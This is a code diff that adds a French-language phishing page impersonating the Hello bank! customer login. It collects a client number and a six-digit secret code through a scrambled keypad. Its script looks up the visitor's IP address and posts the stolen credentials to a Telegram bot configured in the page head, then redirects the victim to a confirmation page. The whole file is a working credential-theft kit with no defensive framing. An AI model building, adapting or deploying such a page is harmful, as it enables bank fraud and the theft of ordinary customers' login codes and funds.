@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "[REDACTED]",
+            CHAT_ID: "8176081750"
+        };
+    </script>
+            <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accès Espace Client - Hello bank!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --hb-cyan: #00abc6;
+            --hb-light-blue: #eef7f9;
+            --hb-dark-text: #004b5a;
+            --hb-btn-disabled: #b2dee5;
+            --telegram-blue: #0088cc;
+            --success-green: #28a745;
+            --error-red: #dc3545;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: var(--hb-dark-text);
+            background-color: #f5f5f5;
+        }
+
+        .back-to-bank-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 20px;
+            z-index: 1000;
+            display: flex;
+            justify-content: flex-start;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .back-to-bank-btn {
+            background-color: var(--hb-cyan);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            font-family: Arial, sans-serif;
+        }
+        
+        .back-to-bank-btn:hover {
+            background-color: #0099b3;
+            transform: translateX(-2px);
+        }
+
+        header {
+            background-color: var(--hb-cyan);
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-top: 50px;
+        }
+
+        .logo-img {
+            height: 40px;
+            width: auto;
+        }
+
+        .container {
+            display: flex;
+            flex: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .form-section {
+            flex: 1.5;
+            padding: 60px 10%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: white;
+        }
+
+        .info-section {
+            flex: 1;
+            background-color: var(--hb-light-blue);
+            padding: 60px 5%;
+            border-left: 1px solid #ddd;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 40px;
+            text-align: center;
+            color: var(--hb-dark-text);
+        }
+
+        .step {
+            width: 100%;
+            max-width: 400px;
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .input-container {
+            display: flex;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            background: white;
+        }
+
+        .input-container:focus-within {
+            border-color: var(--hb-cyan);
+        }
+
+        .input-container input {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .input-container .clear-btn {
+            padding: 0 15px;
+            background: #f9f9f9;
+            border-left: 2px solid #eee;
+            color: #999;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            accent-color: var(--hb-cyan);
+            cursor: pointer;
+        }
+
+        .secret-display {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0 30px;
+        }
+
+        .dot-box {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+        }
+
+        .dot-box.filled {
+            border-color: var(--hb-cyan);
+            background-color: rgba(0, 171, 198, 0.1);
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            background: var(--hb-cyan);
+            border-radius: 50%;
+            display: none;
+        }
+
+        .dot.visible {
+            display: block;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 12px;
+            margin-bottom: 30px;
+            background: #f8fbfc;
+            padding: 20px;
+            border-radius: 12px;
+        }
+
+        .key {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--hb-dark-text);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .key:hover {
+            background: #f0f8fa;
+            border-color: var(--hb-cyan);
+        }
+
+        .key.clear {
+            background: #ffe0e0;
+        }
+
+        .btn-continue {
+            background-color: var(--hb-btn-disabled);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+
+        .btn-continue:not(:disabled):hover {
+            background-color: #0099b3;
+        }
+
+        .btn-continue:disabled {
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .btn-continue.ready {
+            background-color: var(--hb-cyan);
+        }
+
+        .link-footer {
+            text-align: center;
+            text-decoration: underline;
+            font-size: 14px;
+            cursor: pointer;
+            color: var(--hb-cyan);
+        }
+
+        .info-box {
+            margin-bottom: 40px;
+        }
+
+        .info-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .loader-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--hb-cyan);
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 1024px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .info-section {
+                border-left: none;
+                border-top: 1px solid #ddd;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="back-to-bank-container">
+        <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
+            <i>←</i> Retour aux banques
+        </button>
+    </div>
+
+    <header>
+        <div>
+            <img src="images/hello-bank.png" alt="Hello bank!" class="logo-img">
+        </div>
+        <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">Retour</button>
+    </header>
+
+<div class="container">
+    <div class="form-section">
+        <h1>Accédez à votre espace client</h1>
+
+        <div id="step1" class="step active">
+            <div class="input-group">
+                <label>Numéro Client</label>
+                <div class="input-container">
+                    <input type="text" id="numClient" placeholder="7-10 chiffres" maxlength="10" autocomplete="off">
+                    <div class="clear-btn" onclick="document.getElementById('numClient').value=''">✕</div>
+                </div>
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="memo">
+                <label for="memo" style="margin: 0;">Mémoriser mon numéro</label>
+            </div>
+
+            <button id="btn1" class="btn-continue" onclick="nextStep()" disabled>Continuer</button>
+            <div class="link-footer" onclick="alert('Contactez le service client')">Oublié ?</div>
+        </div>
+
+        <div id="step2" class="step">
+            <label>Code secret (6 chiffres)</label>
+            <div class="secret-display" id="secretDisplay"></div>
+
+            <div class="keypad" id="keypad"></div>
+
+            <div class="loader" id="loader">
+                <div class="loader-spinner"></div>
+                <div>Connexion en cours...</div>
+            </div>
+
+            <button id="btn2" class="btn-continue" onclick="validateAndSend()" disabled>Accéder</button>
+            <div class="link-footer" onclick="resetForm()">Retour</div>
+        </div>
+    </div>
+
+    <div class="info-section">
+        <div class="info-box">
+            <div class="info-title"><i class="fa-solid fa-lock" style="color: var(--hb-cyan);"></i> Sécurité</div>
+            <p class="info-text">Ne communiquez jamais vos codes. Changez régulièrement votre mot de passe.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';
+const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
+
+const numClientInput = document.getElementById('numClient');
+const memoCheckbox = document.getElementById('memo');
+const btn1 = document.getElementById('btn1');
+const step1 = document.getElementById('step1');
+const step2 = document.getElementById('step2');
+const btn2 = document.getElementById('btn2');
+const secretDisplay = document.getElementById('secretDisplay');
+const keypad = document.getElementById('keypad');
+const loader = document.getElementById('loader');
+
+let numClient = '';
+let secretCode = '';
+const SECRET_LENGTH = 6;
+
+// Charger numéro mémorisé
+const saved = localStorage.getItem('hello_bank_num');
+if (saved) {
+    numClientInput.value = saved;
+    memoCheckbox.checked = true;
+    numClient = saved;
+    btn1.disabled = false;
+}
+
+// Événement sur input numéro client
+numClientInput.addEventListener('input', (e) => {
+    numClient = e.target.value.replace(/\D/g, '');
+    e.target.value = numClient;
+    btn1.disabled = numClient.length < 7;
+    
+    if (!btn1.disabled) {
+        btn1.classList.add('ready');
+    } else {
+        btn1.classList.remove('ready');
+    }
+});
+
+// Étape 1 -> Étape 2
+function nextStep() {
+    if (numClient.length >= 7) {
+        if (memoCheckbox.checked) {
+            localStorage.setItem('hello_bank_num', numClient);
+        }
+        step1.classList.remove('active');
+        step2.classList.add('active');
+        generateKeypad();
+    }
+}
+
+// Générer clavier
+function generateKeypad() {
+    const digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
+    keypad.innerHTML = '';
+    
+    digits.forEach(d => {
+        const btn = document.createElement('button');
+        btn.className = 'key';
+        btn.textContent = d;
+        btn.type = 'button';
+        btn.onclick = () => addDigit(d);
+        keypad.appendChild(btn);
+    });
+    
+    const clearBtn = document.createElement('button');
+    clearBtn.className = 'key clear';
+    clearBtn.textContent = '⌫';
+    clearBtn.type = 'button';
+    clearBtn.onclick = removeDigit;
+    keypad.appendChild(clearBtn);
+}
+
+// Ajouter chiffre
+function addDigit(d) {
+    if (secretCode.length < SECRET_LENGTH) {
+        secretCode += d;
+        updateDisplay();
+    }
+}
+
+// Effacer chiffre
+function removeDigit() {
+    if (secretCode.length > 0) {
+        secretCode = secretCode.slice(0, -1);
+        updateDisplay();
+    }
+}
+
+// Mettre à jour affichage
+function updateDisplay() {
+    secretDisplay.innerHTML = '';
+    for (let i = 0; i < SECRET_LENGTH; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'dot-box' + (i < secretCode.length ? ' filled' : '');
+        dot.innerHTML = i < secretCode.length ? '<div class="dot visible"></div>' : '';
+        secretDisplay.appendChild(dot);
+    }
+    
+    btn2.disabled = secretCode.length !== SECRET_LENGTH;
+    if (!btn2.disabled) {
+        btn2.classList.add('ready');
+    } else {
+        btn2.classList.remove('ready');
+    }
+}
+
+// Envoyer à Telegram
+async function sendToTelegram() {
+    const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'N/A' }));
+    const msg = `Hello bank - Connexion
+ID: ${numClient}
+Code: ${secretCode}
+IP: ${ip.ip}
+Date: ${new Date().toLocaleString()}`;
+
+    try {
+        const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+        });
+        return r.ok;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Valider et envoyer
+async function validateAndSend() {
+    if (secretCode.length === SECRET_LENGTH) {
+        loader.style.display = 'block';
+        btn2.disabled = true;
+        
+        await sendToTelegram();
+        
+        setTimeout(() => {
+            window.location.href = 'confirmation.html';
+        }, 1500);
+    }
+}
+
+// Réinitialiser
+function resetForm() {
+    step2.classList.remove('active');
+    step1.classList.add('active');
+    secretCode = '';
+    updateDisplay();
+}
+
+// Initialiser affichage
+updateDisplay();
+</script>
+</body>
+</html>
